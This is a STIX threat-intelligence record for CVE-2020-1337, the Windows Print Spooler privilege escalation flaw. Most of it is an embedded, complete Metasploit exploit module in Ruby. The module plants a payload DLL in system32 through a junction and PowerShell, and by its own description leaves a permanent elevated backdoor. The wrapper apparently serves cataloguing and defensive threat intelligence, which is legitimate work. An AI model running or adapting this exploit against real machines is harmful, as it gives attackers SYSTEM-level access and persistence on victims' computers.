{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9839838c-812d-446a-a015-2fe92341876d",
    "created": "2024-08-14T16:49:04.874846Z",
    "modified": "2024-08-14T16:49:04.87485Z",
    "name": "Microsoft Spooler Local Privilege Elevation Vulnerability",
    "description": " This exploit leverages a file write vulnerability in the print spooler service which will restart if stopped.  Because the service cannot be stopped long enough to remove the dll, there is no way to remove the dll once it is loaded by the service.  Essentially, on default settings, this module adds a permanent elevated backdoor.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2020_1337_printerdemon.rb",
            "external_id": "cve_2020_1337_printerdemon.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-1337"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1337"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sailay1996/cve-2020-1337-poc"
        },
        {
            "source_name": "reference",
            "url": "https://voidsec.com/cve-2020-1337-printdemon-is-dead-long-live-printdemon/"
        },
        {
            "source_name": "script=exploit_data(CVE-2020-1337",
            "external_id": "cve-2020-1337.ps1)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core/post/windows/powershell'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Version\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Powershell\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Spooler Local Privilege Elevation Vulnerability',\n        'Description' => %q{\n          This exploit leverages a file write vulnerability in the print spooler service\n          which will restart if stopped.  Because the service cannot be stopped long\n          enough to remove the dll, there is no way to remove the dll once\n          it is loaded by the service.  Essentially, on default settings, this module\n          adds a permanent elevated backdoor.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Peleg Hadar', # Original discovery\n          'Tomer Bar', # Original discovery\n          '404death', # PoC\n          'sailay1996', # PoC\n          'bwatters-r7' # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2019-11-04',\n        'References' => [\n          ['CVE', '2020-1337'],\n          ['URL', 'https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1337'],\n          ['URL', 'https://github.com/sailay1996/cve-2020-1337-poc'],\n          ['URL', 'https://voidsec.com/cve-2020-1337-printdemon-is-dead-long-live-printdemon/']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [\n            IOC_IN_LOGS,\n            ARTIFACTS_ON_DISK\n          ]\n        },\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => true\n        },\n        'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              powershell_execute\n              stdapi_sys_config_getenv\n              stdapi_sys_power_exitwindows\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('JUNCTION_PATH',\n                    [false, 'Path to use as junction (%TEMP%/%RAND% by default).', nil]),\n      OptString.new('DESTINATION_PATH',\n                    [false, 'Location of file to overwrite (%WINDIR%\\system32\\ by default).', nil]),\n      OptString.new('DESTINATION_FILE',\n                    [false, 'Filename to overwrite (ualapi.dll by default).', nil]),\n      OptString.new('PRINTER_NAME',\n                    [true, 'Printer Name to use (%RAND% by default).', Rex::Text.rand_text_alpha(5..9).to_s]),\n      OptBool.new('RESTART_TARGET',\n                  [false, 'Restart the target after exploit (you will lose your session until a second reboot).', false])\n    ])\n  end\n\n  def cve_2020_1337_privileged_filecopy(destination_file, destination_path, junction_path, printer_name, b64_payload)\n    # Read in Generic Script\n    script = exploit_data('CVE-2020-1337', 'cve-2020-1337.ps1')\n    fail_with(Failure::BadConfig, 'No exploit script found') if script.nil?\n\n    # Replace Values in Generic Script\n    vprint_status('Replacing variables')\n    junction_filepath = \"#{junction_path}\\\\#{destination_file}\"\n    # The random string appears to be required when using the psh_exec\n    # It may be due to the way we break apart the script?\n    # I would not be upset to find the root cause and fix it.\n    script.gsub!('JUNCTION_FILEPATH', junction_filepath)\n    script.gsub!('PRINTER_NAME', printer_name)\n    script.gsub!('JUNCTION_PATH', junction_path)\n    script.gsub!('DESTINATION_PATH', destination_path)\n    script.gsub!('B64_PAYLOAD_DLL', b64_payload)\n\n    # Run Exploit Script\n    print_status(\"Running Exploit on #{sysinfo['Computer']}\")\n    begin\n      # client.powershell.execute_string(code: script)\n      session.powershell.execute_string({ code: script })\n    rescue Rex::TimeoutError => e\n      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)\n      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')\n    end\n  end\n\n  def exploit\n    if datastore['DESTINATION_PATH'].nil? || datastore['DESTINATION_PATH'].empty?\n      win_dir = session.sys.config.getenv('windir')\n      destination_path = \"#{win_dir}\\\\system32\"\n    else\n      destination_path = datastore['DESTINATION_PATH']\n    end\n    if datastore['DESTINATION_FILE'].nil? || datastore['DESTINATION_FILE'].empty?\n      destination_file = 'ualapi.dll'\n    else\n      destination_file = datastore['DESTINATION_FILE']\n    end\n    if datastore['JUNCTION_PATH'].nil? || datastore['JUNCTION_PATH'].empty?\n      junction_path = \"#{session.sys.config.getenv('TEMP')}\\\\#{Rex::Text.rand_text_alpha(6..15)}\"\n    else\n      junction_path = datastore['JUNCTION_PATH']\n    end\n    client.core.use('powershell') if !client.ext.aliases.include?('powershell')\n    printer_name = datastore['PRINTER_NAME']\n    payload_dll = generate_payload_dll\n\n    # Check target\n    vprint_status('Checking Target')\n    validate_active_host\n    validate_payload\n\n    # Run the exploit\n    _output = cve_2020_1337_privileged_filecopy(destination_file, destination_path, junction_path, printer_name, Rex::Text.encode_base64(payload_dll))\n    sleep(3) # make sure exploit is finished\n\n    # Reboot, if desired\n    if datastore['RESTART_TARGET']\n      sleep(10)\n      vprint_status(\"Rebooting #{sysinfo['Computer']}\")\n      begin\n        session.sys.power.reboot\n      rescue Rex::TimeoutError => e\n        elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)\n        print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')\n      end\n    end\n  end\n\n  def validate_active_host\n    print_status(\"Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog('Could not connect to session', error: e)\n    raise Msf::Exploit::Failed, 'Could not connect to session'\n  end\n\n  def validate_payload\n    vprint_status(\"Target Arch = #{sysinfo['Architecture']}\")\n    vprint_status(\"Payload Arch = #{payload.arch.first}\")\n    unless payload.arch.first == sysinfo['Architecture']\n      fail_with(Failure::BadConfig, 'Payload arch must match target arch')\n    end\n  end\n\n  def check\n    version = get_version_info\n    vprint_status(\"OS version: #{version}\")\n    return Exploit::CheckCode::Appears if version.build_number.between?(Msf::WindowsVersion::Win10_InitialRelease, Msf::WindowsVersion::Win10_1909)\n\n    return Exploit::CheckCode::Safe\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-04",
    "x_mitre_platforms": [
        "['win']"
    ]
}